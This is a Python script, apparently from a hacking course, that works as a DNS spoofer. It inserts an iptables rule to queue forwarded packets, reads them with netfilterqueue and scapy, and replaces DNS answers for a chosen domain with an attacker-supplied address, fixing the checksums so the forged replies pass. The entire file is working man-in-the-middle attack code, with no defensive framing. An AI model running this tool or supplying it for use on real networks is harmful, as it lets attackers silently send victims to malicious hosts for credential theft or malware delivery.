#!/usr/bin/env python

# Command to create a queue of packets: $ iptables -I FORWARD -j NFQUEUE --queue-num 0
# Command to clean the queues: $ iptables --flush

from ast import arguments
import netfilterqueue
import optparse
import scapy.all as scapy
import subprocess

def setup():
    print("[+] Setting up packets queue...")
    subprocess.call(["iptables", "-I", "FORWARD", "-j", "NFQUEUE", "--queue-num", "0"])
    print("[+] Getting params...")
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target-address", dest="target_address", help="The page DNS address to be spoofed")
    parser.add_option("-n", "--new-host", dest="new_host", help="The new host that the DNS would be redirected")
    (options, arguments) = parser.parse_args()

    if not options.new_host:
        parser.error("[-] Param --new-host is required. Use --help for more information.")

    print("[+] Set up finished.")
    return options

def process_packet(packet, options):
    scapy_packet = scapy.IP(packet.get_payload())
    if scapy_packet.haslayer(scapy.DNSRR):
        qname = scapy_packet[scapy.DNSQR].qname
        if options.target_address in str(qname):
            print("[+] Spoofing target")
            answer = scapy.DNSRR(rrname=qname, rdata=options.new_host)
            scapy_packet[scapy.DNS].an = answer
            scapy_packet[scapy.DNS].ancount = 1

            del scapy_packet[scapy.IP].len
            del scapy_packet[scapy.IP].chksum
            del scapy_packet[scapy.UDP].len
            del scapy_packet[scapy.UDP].chksum

            packet.set_payload(bytes(scapy_packet))
    packet.accept()


try:
    options = setup()
    queue = netfilterqueue.NetfilterQueue()
    queue.bind(0, lambda packet: process_packet(packet, options))
    queue.run()
except KeyboardInterrupt:
    print("\n[+] Quitting due to interrupt. Resetting iptables, please wait...")
    subprocess.call(["iptables", "--flush"])
    print("\n[+] iptables successfully restored")
